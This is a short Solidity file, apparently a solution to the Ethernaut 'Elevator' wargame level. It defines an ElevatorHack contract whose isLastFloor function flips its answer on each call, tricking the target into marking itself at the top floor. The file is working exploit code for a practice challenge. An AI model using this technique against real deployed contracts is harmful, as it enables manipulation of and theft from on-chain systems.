// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol';

contract ElevatorHack is Building {
    Elevator public elevator;
    bool public pivot;

    constructor(address addrElevator) {
        elevator = Elevator(addrElevator);
        pivot = true;
    }

    function isLastFloor(uint) external override returns (bool) {
        pivot = !pivot;
        return pivot;
    }

    function attack() external {
        elevator.goTo(777);
    }
}
